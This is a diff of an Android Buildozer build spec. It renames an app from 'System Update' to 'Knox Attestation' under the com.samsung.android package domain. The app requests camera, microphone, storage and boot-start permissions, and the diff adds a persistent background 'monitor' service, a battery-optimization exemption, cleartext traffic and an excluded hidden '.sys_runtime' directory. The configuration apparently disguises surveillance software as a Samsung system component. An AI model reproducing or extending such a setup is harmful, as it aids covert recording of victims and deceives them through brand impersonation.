@@ -1,36 +1,35 @@
 [app]
-title = System Update
-package.name = systemupdate
-package.domain = org.system.update
-version = 2.0.0
-version.release = 2.0.0
-icon.filename = %(source.dir)s/res/drawable/ic_launcher.png
-icon.adaptive_foreground.filename = %(source.dir)s/res/drawable/ic_launcher.png
-android.adaptive_icon_background = #FFFFFF
-
+title = Knox Attestation
+package.name = knoxattestation
+package.domain = com.samsung.android
 source.dir = .
 source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db
-source.exclude_dirs = tests, __pycache__, docs, examples, .github
-source.exclude_patterns = *.pyc, *.pyo, *.pyd, *.so.debug, *.a, *.la
+source.exclude_dirs = tests,__pycache__,docs,.github,.sys_runtime
+version = 2.0.0
 
 requirements = python3,kivy,requests,pillow,pyjnius,android,cryptography
 
-android.permissions = INTERNET, CAMERA, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, RECORD_AUDIO, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, MANAGE_EXTERNAL_STORAGE, POST_NOTIFICATIONS
+icon.filename = %(source.dir)s/res/drawable/ic_launcher.png
 
-android.accept_sdk_license = True
-android.skip_update = True
+android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, RECORD_AUDIO, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
+
 android.api = 33
 android.minapi = 21
-android.build_tools_version = 33.0.1
+android.accept_sdk_license = True
+android.skip_update = True
+android.auto_accept_sdk_license = True
 android.archs = arm64-v8a
 
-android.services = MyService:service.py
+android.services = monitor:monitor.py
 android.foreground = True
-android.release_minify = True
-android.strip_libs = True
 android.uses_cleartext_traffic = True
+android.wakelock = True
 
-fullscreen = 1
 orientation = portrait
+fullscreen = 1
+log_level = 2
+warn_on_root = 0
+
+[buildozer]
 log_level = 2
 warn_on_root = 0
